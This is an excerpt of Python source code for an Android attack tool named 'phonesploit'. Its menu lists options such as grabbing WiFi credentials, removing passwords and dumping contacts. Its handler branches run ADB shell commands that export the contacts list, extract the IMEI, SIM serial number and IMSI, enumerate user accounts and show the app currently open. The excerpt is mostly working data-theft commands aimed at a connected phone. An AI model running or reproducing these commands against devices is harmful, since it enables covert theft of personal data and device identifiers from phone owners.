...
page_2 = '''\n
{0}[{1}16{0}]{2} Port Forwarding        {0}[{1}23{0}]{2} Remove Password	 {0}[{1}30{0}]{2} Dump Contacts
{0}[{1}17{0}]{2} Grab wpa_supplicant    {0}[{1}24{0}]{2} Use Keycode      	 {0}[{1}31{0}]{2} Sim Card Number   
{0}[{1}18{0}]{2} Show Mac/Inet          {0}[{1}25{0}]{2} Get Current Activity    {0}[{1}32{0}]{2} IMSI Number
{0}[{1}19{0}]{2} Extract apk from app   {0}[{1}26{0}]{2} Get Android Version	     
{0}[{1}20{0}]{2} Get Battery Status	{0}[{1}27{0}]{2} Imei Number		
{0}[{1}21{0}]{2} NetStat      		{0}[{1}28{0}]{2} Current Opened App		
{0}[{1}22{0}]{2} Turn WiFi On/Off       {0}[{1}29{0}]{2} Get User Accounts     
						

{0}[{1}99{0}] {2}Exit   {0}[{1}0{0}] {2}Clear   {0}[{1}p{0}] Next Page   {0}[{1}b{0}] Back to page one
'''.format(Fore.CYAN, Fore.RED, Fore.GREEN)
...
def main():
    ...
    85 -->  "TAG_LAST_KEYCODE"
            ...
            os.system("adb -s " +device_name+ " shell getprop ro.build.version.release > ./andver.txt | echo '====== The android version is ====== ' && cat ./andver.txt")            
	    option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
	    
	elif option == '27':
	    os.system("adb -s " +device_name+ " shell service call iphonesubinfo 3 i32 1 |tr -d '.' | cut -d ^[\'] -f2 | cut -d '.' -f1-")
	    option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
            
        elif option == '28':
            os.system("adb -s " +device_name+ " shell dumpsys window windows | grep -E 'mCurrentFocus|mCurrentApp'")
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
            
        elif option == '29':
            os.system("adb -s " +device_name+ " shell dumpsys account | grep -Ew 'UserInfo|Account'")
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
            
        elif option == '30':
            os.system("adb -s " +device_name+ " shell content query --uri content://contacts/phones --projection display_name:number > ./contacts.txt | echo '[+]=== We successfully dumpped the contacts list ===[+] ' && cat ./contacts.txt | tr -d ':' | cut -d ' ' -f3- > ./modifiedcontacts.txt && cat ./modifiedcontacts.txt | uniq && echo '[+] Contacts saved to **modifiedcontacts.txt** file [+]'")
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
            
        elif option == '31':
            os.system("adb -s " +device_name+ " shell service call iphonesubinfo 13 i32 2 |tr -d '.' | cut -d \' -f2 | cut -d '.' -f2-5 | grep -oE '[0-9]' | xargs | tr -d ' '")
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
            
        elif option == '32':
            os.system("adb -s " +device_name+ " shell service call iphonesubinfo 12 i32 1 |tr -d '.' | cut -d \' -f2 | xargs | tr -d ' '")
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
